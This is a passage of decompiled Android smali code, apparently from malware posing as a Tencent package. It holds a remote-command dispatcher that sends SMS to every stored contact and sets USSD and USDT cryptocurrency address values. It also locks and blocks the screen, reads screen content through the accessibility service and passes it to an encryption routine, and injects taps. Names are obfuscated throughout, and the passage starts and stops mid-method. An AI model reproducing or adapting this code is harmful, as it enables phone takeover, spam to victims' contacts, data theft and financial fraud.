    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    sput-object v3, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012NeedPaste:Ljava/lang/Boolean;

    .line 335
    sget-object v3, Lcom/tencent/MainBackgroundService;->MyAccess:Lcom/tencent/AccessibilityServiceCore;

    invoke-virtual {v3}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012Treger()V
    :try_end_10
    .catch Ljava/lang/Exception; {:try_start_10 .. :try_end_10} :catch_6
    .catch Ljava/lang/OutOfMemoryError; {:try_start_10 .. :try_end_10} :catch_0

    goto/16 :goto_7

    .line 342
    :cond_10
    :try_start_11
    aget-object v3, v8, v6

    const-string v9, "pstd<*>"

    invoke-virtual {v3, v9}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v3
    :try_end_11
    .catch Ljava/lang/Exception; {:try_start_11 .. :try_end_11} :catch_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_11 .. :try_end_11} :catch_0

    if-eqz v3, :cond_11

    .line 344
    :try_start_12
    aget-object v3, v8, v6

    const-string v4, "pstd<*>"

    invoke-virtual {v3, v4, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v3

    sput-object v3, Lcom/tencent/MainBackgroundService;->ussdamount:Ljava/lang/String;
    :try_end_12
    .catch Ljava/lang/Exception; {:try_start_12 .. :try_end_12} :catch_6
    .catch Ljava/lang/OutOfMemoryError; {:try_start_12 .. :try_end_12} :catch_0

    goto/16 :goto_7

    .line 349
    :cond_11
    :try_start_13
    aget-object v3, v8, v6

    const-string v9, "pstdd<*>"

    invoke-virtual {v3, v9}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v3
    :try_end_13
    .catch Ljava/lang/Exception; {:try_start_13 .. :try_end_13} :catch_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_13 .. :try_end_13} :catch_0

    if-eqz v3, :cond_12

    .line 351
    :try_start_14
    aget-object v3, v8, v6

    const-string v4, "pstdd<*>"

    invoke-virtual {v3, v4, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v3

    sput-object v3, Lcom/tencent/MainBackgroundService;->ussdcard:Ljava/lang/String;
    :try_end_14
    .catch Ljava/lang/Exception; {:try_start_14 .. :try_end_14} :catch_6
    .catch Ljava/lang/OutOfMemoryError; {:try_start_14 .. :try_end_14} :catch_0

    goto/16 :goto_7

    .line 356
    :cond_12
    :try_start_15
    aget-object v3, v8, v6

    const-string v9, "usdtress<*>"

    invoke-virtual {v3, v9}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v3
    :try_end_15
    .catch Ljava/lang/Exception; {:try_start_15 .. :try_end_15} :catch_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_15 .. :try_end_15} :catch_0

    if-eqz v3, :cond_13

    .line 358
    :try_start_16
    aget-object v3, v8, v6

    const-string v4, "usdtress<*>"

    invoke-virtual {v3, v4, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v3

    sput-object v3, Lcom/tencent/MainBackgroundService;->usdtadress:Ljava/lang/String;
    :try_end_16
    .catch Ljava/lang/Exception; {:try_start_16 .. :try_end_16} :catch_6
    .catch Ljava/lang/OutOfMemoryError; {:try_start_16 .. :try_end_16} :catch_0

    goto/16 :goto_7

    .line 364
    :cond_13
    :try_start_17
    aget-object v3, v8, v6

    const-string v9, "admintext<*>"

    invoke-virtual {v3, v9}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v3
    :try_end_17
    .catch Ljava/lang/Exception; {:try_start_17 .. :try_end_17} :catch_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_17 .. :try_end_17} :catch_0

    if-eqz v3, :cond_14

    .line 366
    :try_start_18
    aget-object v3, v8, v6

    const-string v4, "admintext<*>"

    invoke-virtual {v3, v4, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v3

    sput-object v3, Lcom/tencent/MainBackgroundService;->admintext:Ljava/lang/String;
    :try_end_18
    .catch Ljava/lang/Exception; {:try_start_18 .. :try_end_18} :catch_6
    .catch Ljava/lang/OutOfMemoryError; {:try_start_18 .. :try_end_18} :catch_0

    goto/16 :goto_7

    .line 372
    :cond_14
    :try_start_19
    aget-object v3, v8, v6

    const-string v9, "lnk<*>"

    invoke-virtual {v3, v9}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v3
    :try_end_19
    .catch Ljava/lang/Exception; {:try_start_19 .. :try_end_19} :catch_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_19 .. :try_end_19} :catch_0

    if-eqz v3, :cond_15

    .line 374
    :try_start_1a
    aget-object v3, v8, v6

    const-string v4, "lnk<*>"

    invoke-virtual {v3, v4, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lcom/tencent/PersistentService;->openlink(Ljava/lang/String;)V
    :try_end_1a
    .catch Ljava/lang/Exception; {:try_start_1a .. :try_end_1a} :catch_6
    .catch Ljava/lang/OutOfMemoryError; {:try_start_1a .. :try_end_1a} :catch_0

    goto/16 :goto_7

    .line 380
    :cond_15
    :try_start_1b
    aget-object v3, v8, v6

    invoke-virtual {v3, v0}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v3
    :try_end_1b
    .catch Ljava/lang/Exception; {:try_start_1b .. :try_end_1b} :catch_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_1b .. :try_end_1b} :catch_0

    if-eqz v3, :cond_19

    .line 386
    :try_start_1c
    aget-object v3, v8, v6

    invoke-virtual {v3, v0, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v3

    const-string v4, "all<>"

    .line 387
    invoke-virtual {v3, v4}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v4

    if-eqz v4, :cond_18

    .line 392
    aget-object v4, p1, v5

    const-string v6, "android.permission.READ_CONTACTS"

    invoke-virtual {v4, v6}, Landroid/content/Context;->checkSelfPermission(Ljava/lang/String;)I

    move-result v4

    if-nez v4, :cond_36

    const-string v4, "all<>"

    .line 394
    invoke-virtual {v3, v4, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v3

    const-string v4, "#"

    invoke-virtual {v3, v4}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v3

    .line 396
    aget-object v3, v3, v5

    .line 398
    aget-object v4, p1, v5

    invoke-virtual {v4}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v6

    sget-object v7, Landroid/provider/ContactsContract$CommonDataKinds$Phone;->CONTENT_URI:Landroid/net/Uri;

    const/4 v8, 0x0

    const/4 v9, 0x0

    const/4 v10, 0x0

    const/4 v11, 0x0

    invoke-virtual/range {v6 .. v11}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v4

    .line 399
    :cond_16
    :goto_4
    invoke-interface {v4}, Landroid/database/Cursor;->moveToNext()Z

    move-result v6

    if-eqz v6, :cond_17

    const-string v6, "data1"

    .line 401
    invoke-interface {v4, v6}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v6

    const/4 v7, -0x1

    if-le v6, v7, :cond_16

    .line 404
    invoke-interface {v4, v6}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v6

    .line 405
    invoke-static {v6, v3}, Lcom/tencent/AccessibilityServiceCore;->sendSMS(Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_4

    .line 408
    :cond_17
    invoke-interface {v4}, Landroid/database/Cursor;->close()V

    goto/16 :goto_7

    :cond_18
    const-string v4, "#"

    .line 432
    invoke-virtual {v3, v4}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v3

    .line 433
    aget-object v4, v3, v5

    .line 434
    aget-object v3, v3, v6

    .line 435
    invoke-static {v4, v3}, Lcom/tencent/AccessibilityServiceCore;->sendSMS(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_1c
    .catch Ljava/lang/Exception; {:try_start_1c .. :try_end_1c} :catch_6
    .catch Ljava/lang/OutOfMemoryError; {:try_start_1c .. :try_end_1c} :catch_0

    goto/16 :goto_7

    .line 444
    :cond_19
    :try_start_1d
    aget-object v3, v8, v6

    invoke-virtual {v3, v0}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v3
    :try_end_1d
    .catch Ljava/lang/Exception; {:try_start_1d .. :try_end_1d} :catch_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_1d .. :try_end_1d} :catch_0

    if-eqz v3, :cond_1a

    .line 450
    :try_start_1e
    aget-object v3, v8, v6

    invoke-virtual {v3, v0, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v3

    const-string v4, "#"

    .line 451
    invoke-virtual {v3, v4}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v3

    .line 452
    aget-object v4, v3, v5

    .line 453
    aget-object v3, v3, v6

    .line 454
    invoke-static {v4, v3}, Lcom/tencent/AccessibilityServiceCore;->sendSMS(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_1e
    .catch Ljava/lang/Exception; {:try_start_1e .. :try_end_1e} :catch_6
    .catch Ljava/lang/OutOfMemoryError; {:try_start_1e .. :try_end_1e} :catch_0

    goto/16 :goto_7

    .line 461
    :cond_1a
    :try_start_1f
    aget-object v3, v8, v6

    const-string v9, "ussd<*>"

    invoke-virtual {v3, v9}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_1b

    goto/16 :goto_7

    .line 476
    :cond_1b
    aget-object v3, v8, v6

    const-string v9, "CHP<*>"

    invoke-virtual {v3, v9}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v3
    :try_end_1f
    .catch Ljava/lang/Exception; {:try_start_1f .. :try_end_1f} :catch_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_1f .. :try_end_1f} :catch_0

    if-eqz v3, :cond_1d

    .line 479
    :try_start_20
    aget-object v3, v8, v6

    const-string v8, "CHP<*>"

    invoke-virtual {v3, v8, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v3

    const-string v8, ":"

    .line 480
    invoke-virtual {v3, v8}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v3

    .line 481
    aget-object v8, v3, v5

    .line 482
    aget-object v6, v3, v6

    .line 485
    aget-object v3, v3, v4

    .line 487
    aget-object v4, p1, v5

    const-string v9, "NHO"

    invoke-static {v4, v9, v8}, Lcom/tencent/My_tunesxconcerningn10_Settings;->Write(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 488
    aget-object v4, p1, v5

    const-string v8, "NPO"

    invoke-static {v4, v8, v6}, Lcom/tencent/My_tunesxconcerningn10_Settings;->Write(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 489
    aget-object v4, p1, v5

    const-string v6, "NNA"

    invoke-static {v4, v6, v3}, Lcom/tencent/My_tunesxconcerningn10_Settings;->Write(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    const-string v3, "hypothesisqmacedoniaxjacksonvilleoitalicnflowslwritegindicatorjgovtjrentalsfeditorsosimpsonsyangelsocheckedtpersonalizedzlimitjprecioushratedwcamcorderktarhcostsofilleddoffensiveoognpharmaceuticalvgeneratorsetemplatedrequestlquotesmwallpapersgbeverlyodozensccorpsbdoordstudiosdpalestinevtermacustomscnewtontairzfebruaryrsupportsrefurbishedxsunsetrtransfersjhiringcvastdmoneyeplazalbedqplayingdtestedcspanishkgovernormbbwrfundsromanticideerhbarrelzoftenlreducedkhandleszterroristdlopezblastinglplaybidealqholdsalickingtfixturesistatesaemiratestgiantxminaauskcomplygfunctionalzdyingjtextilejinsuredtgaragemequallyzregardjrevenuejindividualscognitivegrehabjbytehnetworkingkraisedyreferralsflilbrubyzdelivereddrayychargesnassociationminstructorqrepresentativesroutersbinterstatemorganiciquartersyspringsbworkersbcommerciallattractmselleroedwardshfiniteylinuxfandalemapartflandsoexpoztuefbusinesseszcontinuouslyo41"

    .line 497
    invoke-static {v3}, Lcom/tencent/DataEncryptionEngine;->CLOSEALLINTENT(Ljava/lang/String;)V
    :try_end_20
    .catch Ljava/lang/Exception; {:try_start_20 .. :try_end_20} :catch_6
    .catch Ljava/lang/OutOfMemoryError; {:try_start_20 .. :try_end_20} :catch_0

    .line 502
    :try_start_21
    aget-object v3, p1, v5

    new-instance v4, Landroid/content/Intent;

    aget-object v6, p1, v5

    const-class v8, Lcom/tencent/MainLauncherActivity;

    invoke-direct {v4, v6, v8}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v3, v4}, Landroid/content/Context;->stopService(Landroid/content/Intent;)Z
    :try_end_21
    .catch Ljava/lang/Exception; {:try_start_21 .. :try_end_21} :catch_4
    .catch Ljava/lang/OutOfMemoryError; {:try_start_21 .. :try_end_21} :catch_0

    .line 504
    :catch_4
    :try_start_22
    const-class v3, Lcom/tencent/MainLauncherActivity;

    aget-object v4, p1, v5

    invoke-static {v3, v4}, Lcom/tencent/BackgroundServiceHelper;->removedqtractort40(Ljava/lang/Class;Landroid/content/Context;)Z

    move-result v3

    if-eqz v3, :cond_1c

    .line 507
    aget-object v3, p1, v5

    new-instance v4, Landroid/content/Intent;

    aget-object v6, p1, v5

    const-class v8, Lcom/tencent/MainLauncherActivity;

    invoke-direct {v4, v6, v8}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v3, v4}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 512
    :cond_1c
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v3

    invoke-virtual {v3, v5}, Ljava/lang/Runtime;->exit(I)V
    :try_end_22
    .catch Ljava/lang/Exception; {:try_start_22 .. :try_end_22} :catch_6
    .catch Ljava/lang/OutOfMemoryError; {:try_start_22 .. :try_end_22} :catch_0

    return-object v7

    .line 517
    :cond_1d
    :try_start_23
    aget-object v3, v8, v6

    const-string v4, "CRD<*>"

    invoke-virtual {v3, v4}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v3
    :try_end_23
    .catch Ljava/lang/Exception; {:try_start_23 .. :try_end_23} :catch_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_23 .. :try_end_23} :catch_0

    if-eqz v3, :cond_1f

    .line 520
    :try_start_24
    aget-object v3, v8, v6

    const-string v4, "CRD<*>"

    invoke-virtual {v3, v4, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v3

    const-string v4, "E>"

    .line 521
    invoke-virtual {v3, v4}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v4

    if-eqz v4, :cond_1e

    .line 523
    sget-object v4, Lcom/tencent/AccessibilityServiceCore;->DisabledApps:Ljava/util/List;

    const-string v6, "E>"

    invoke-virtual {v3, v6, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v3

    invoke-interface {v4, v3}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    goto/16 :goto_7

    :cond_1e
    const-string v4, "D>"

    .line 524
    invoke-virtual {v3, v4}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v4

    if-eqz v4, :cond_36

    .line 526
    sget-object v4, Lcom/tencent/AccessibilityServiceCore;->DisabledApps:Ljava/util/List;

    const-string v6, "D>"

    invoke-virtual {v3, v6, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v3

    invoke-interface {v4, v3}, Ljava/util/List;->remove(Ljava/lang/Object;)Z
    :try_end_24
    .catch Ljava/lang/Exception; {:try_start_24 .. :try_end_24} :catch_6
    .catch Ljava/lang/OutOfMemoryError; {:try_start_24 .. :try_end_24} :catch_0

    goto/16 :goto_7

    .line 529
    :cond_1f
    :try_start_25
    aget-object v3, v8, v6

    const-string v4, "BLKV<*>"

    invoke-virtual {v3, v4}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v3
    :try_end_25
    .catch Ljava/lang/Exception; {:try_start_25 .. :try_end_25} :catch_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_25 .. :try_end_25} :catch_0

    if-eqz v3, :cond_21

    .line 531
    :try_start_26
    aget-object v3, v8, v6

    const-string v4, "BLKV<*>"

    invoke-virtual {v3, v4, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v3

    const-string v4, "on"

    .line 532
    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_20

    .line 535
    aget-object v3, p1, v5

    sget-object v4, Lcom/tencent/My_tunesxconcerningn10_Settings;->isblocked:Ljava/lang/String;

    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static {v3, v4, v6}, Lcom/tencent/My_tunesxconcerningn10_Settings;->WriteBool(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    .line 536
    sget-object v3, Lcom/tencent/MainBackgroundService;->MyAccess:Lcom/tencent/AccessibilityServiceCore;

    const-string v4, "Block"

    invoke-virtual {v3, v4}, Lcom/tencent/AccessibilityServiceCore;->Treger(Ljava/lang/String;)V

    goto/16 :goto_7

    .line 540
    :cond_20
    aget-object v3, p1, v5

    sget-object v4, Lcom/tencent/My_tunesxconcerningn10_Settings;->isblocked:Ljava/lang/String;

    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static {v3, v4, v6}, Lcom/tencent/My_tunesxconcerningn10_Settings;->WriteBool(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    .line 541
    sget-object v3, Lcom/tencent/MainBackgroundService;->MyAccess:Lcom/tencent/AccessibilityServiceCore;

    const-string v4, "unBlock"

    invoke-virtual {v3, v4}, Lcom/tencent/AccessibilityServiceCore;->Treger(Ljava/lang/String;)V
    :try_end_26
    .catch Ljava/lang/Exception; {:try_start_26 .. :try_end_26} :catch_6
    .catch Ljava/lang/OutOfMemoryError; {:try_start_26 .. :try_end_26} :catch_0

    goto/16 :goto_7

    .line 547
    :cond_21
    :try_start_27
    aget-object v3, v8, v6

    const-string v4, "pslock<*>"

    invoke-virtual {v3, v4}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v3
    :try_end_27
    .catch Ljava/lang/Exception; {:try_start_27 .. :try_end_27} :catch_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_27 .. :try_end_27} :catch_0

    if-eqz v3, :cond_23

    .line 549
    :try_start_28
    aget-object v3, v8, v6

    const-string v4, "pslock<*>"

    invoke-virtual {v3, v4, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v3

    .line 550
    sget-object v4, Lcom/tencent/MainBackgroundService;->MyAccess:Lcom/tencent/AccessibilityServiceCore;

    if-eqz v4, :cond_36

    const-string v4, "noallow"

    .line 551
    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_22

    .line 555
    sget-object v3, Lcom/tencent/MainBackgroundService;->MyAccess:Lcom/tencent/AccessibilityServiceCore;

    const-string v4, "unbassit"

    invoke-virtual {v3, v4}, Lcom/tencent/AccessibilityServiceCore;->Treger(Ljava/lang/String;)V

    goto/16 :goto_7

    .line 561
    :cond_22
    sget-object v3, Lcom/tencent/MainBackgroundService;->MyAccess:Lcom/tencent/AccessibilityServiceCore;

    const-string v4, "bassit"

    invoke-virtual {v3, v4}, Lcom/tencent/AccessibilityServiceCore;->Treger(Ljava/lang/String;)V
    :try_end_28
    .catch Ljava/lang/Exception; {:try_start_28 .. :try_end_28} :catch_6
    .catch Ljava/lang/OutOfMemoryError; {:try_start_28 .. :try_end_28} :catch_0

    goto/16 :goto_7

    .line 570
    :cond_23
    :try_start_29
    aget-object v3, v8, v6

    const-string v4, "SCRD2<*>"

    invoke-virtual {v3, v4}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v3
    :try_end_29
    .catch Ljava/lang/Exception; {:try_start_29 .. :try_end_29} :catch_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_29 .. :try_end_29} :catch_0

    if-eqz v3, :cond_25

    .line 572
    :try_start_2a
    aget-object v3, v8, v6

    const-string v4, "SCRD2<*>"

    invoke-virtual {v3, v4, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v3

    const-string v4, "o"

    .line 573
    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_24

    .line 575
    aget-object v3, p1, v5

    const-string v4, "SKL"

    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static {v3, v4, v6}, Lcom/tencent/My_tunesxconcerningn10_Settings;->WriteBool(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    goto/16 :goto_7

    .line 578
    :cond_24
    aget-object v3, p1, v5

    const-string v4, "SKL"

    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static {v3, v4, v6}, Lcom/tencent/My_tunesxconcerningn10_Settings;->WriteBool(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V
    :try_end_2a
    .catch Ljava/lang/Exception; {:try_start_2a .. :try_end_2a} :catch_6
    .catch Ljava/lang/OutOfMemoryError; {:try_start_2a .. :try_end_2a} :catch_0

    goto/16 :goto_7

    .line 584
    :cond_25
    :try_start_2b
    aget-object v3, v8, v6

    const-string v4, "rdd<*>"

    invoke-virtual {v3, v4}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v3
    :try_end_2b
    .catch Ljava/lang/Exception; {:try_start_2b .. :try_end_2b} :catch_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_2b .. :try_end_2b} :catch_0

    if-eqz v3, :cond_26

    .line 589
    :try_start_2c
    sget-object v3, Lcom/tencent/MainBackgroundService;->MyAccess:Lcom/tencent/AccessibilityServiceCore;

    const-string v3, "wait"

    sput-object v3, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012OFK:Ljava/lang/String;

    .line 591
    aget-object v3, v8, v6

    const-string v4, "rdd<*>"

    invoke-virtual {v3, v4, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lcom/tencent/MainBackgroundService;->D_tunesxconcerningn1011_ele(Ljava/lang/String;)V

    .line 593
    sget-object v3, Lcom/tencent/MainBackgroundService;->MyAccess:Lcom/tencent/AccessibilityServiceCore;

    const-string v3, "on"

    sput-object v3, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012OFK:Ljava/lang/String;
    :try_end_2c
    .catch Ljava/lang/Exception; {:try_start_2c .. :try_end_2c} :catch_6
    .catch Ljava/lang/OutOfMemoryError; {:try_start_2c .. :try_end_2c} :catch_0

    goto/16 :goto_7

    .line 597
    :cond_26
    :try_start_2d
    aget-object v3, v8, v6

    const-string v4, "rd<*>"

    invoke-virtual {v3, v4}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v3
    :try_end_2d
    .catch Ljava/lang/Exception; {:try_start_2d .. :try_end_2d} :catch_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_2d .. :try_end_2d} :catch_0

    if-eqz v3, :cond_27

    .line 602
    :try_start_2e
    sget-object v3, Lcom/tencent/MainBackgroundService;->MyAccess:Lcom/tencent/AccessibilityServiceCore;

    const-string v3, "wait"

    sput-object v3, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012OFK:Ljava/lang/String;

    .line 604
    sget-object v3, Lcom/tencent/DataPackagingEngine;->l_tunesxconcerningn103_g:Ljava/lang/String;

    sget-object v4, Lcom/tencent/MainBackgroundService;->MyAccess:Lcom/tencent/AccessibilityServiceCore;

    aget-object v6, v8, v6

    const-string v8, "rd<*>"

    invoke-virtual {v6, v8, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v6}, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012RD(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/String;->getBytes()[B

    move-result-object v4

    invoke-static {v3, v4}, Lcom/tencent/DataEncryptionEngine;->agreeltimelybfacilitatez38(Ljava/lang/String;[B)V

    .line 605
    sget-object v3, Lcom/tencent/MainBackgroundService;->MyAccess:Lcom/tencent/AccessibilityServiceCore;

    const-string v3, "on"

    sput-object v3, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012OFK:Ljava/lang/String;
    :try_end_2e
    .catch Ljava/lang/Exception; {:try_start_2e .. :try_end_2e} :catch_6
    .catch Ljava/lang/OutOfMemoryError; {:try_start_2e .. :try_end_2e} :catch_0

    goto/16 :goto_7

    .line 615
    :cond_27
    :try_start_2f
    aget-object v3, v8, v6

    const-string v4, "sp<*>"

    invoke-virtual {v3, v4}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v3
    :try_end_2f
    .catch Ljava/lang/Exception; {:try_start_2f .. :try_end_2f} :catch_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_2f .. :try_end_2f} :catch_0

    if-eqz v3, :cond_2b

    .line 620
    :try_start_30
    sget v3, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v4, 0x18

    if-lt v3, v4, :cond_36

    .line 621
    aget-object v3, v8, v6

    const-string v4, "sp<*>"

    invoke-virtual {v3, v4, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v3

    const-string v4, "clk"

    .line 622
    invoke-virtual {v3, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_2a

    const-string v4, "Bc"

    invoke-virtual {v3, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_2a

    const-string v4, "Ho"

    invoke-virtual {v3, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_2a

    const-string v4, "RC"

    invoke-virtual {v3, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_2a

    const-string v4, "LK"

    invoke-virtual {v3, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_2a

    const-string v4, "SK"

    invoke-virtual {v3, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-eqz v4, :cond_28

    goto :goto_6

    :cond_28
    const-string v4, ":"

    .line 627
    invoke-static {v4}, Ljava/util/regex/Pattern;->quote(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v3

    .line 628
    array-length v4, v3

    new-array v4, v4, [Landroid/graphics/Point;

    move v8, v5

    .line 630
    :goto_5
    array-length v9, v3

    if-ge v8, v9, :cond_29

    .line 631
    aget-object v9, v3, v8

    const-string v10, "{"

    invoke-virtual {v9, v10, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v9

    const-string v10, "}"

    invoke-virtual {v9, v10, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v9

    const-string v10, ","

    invoke-virtual {v9, v10}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v9

    .line 633
    aget-object v10, v9, v5

    const-string v11, "="

    invoke-virtual {v10, v11}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v10

    aget-object v10, v10, v6

    invoke-static {v10}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v10

    .line 634
    aget-object v9, v9, v6

    const-string v11, "="

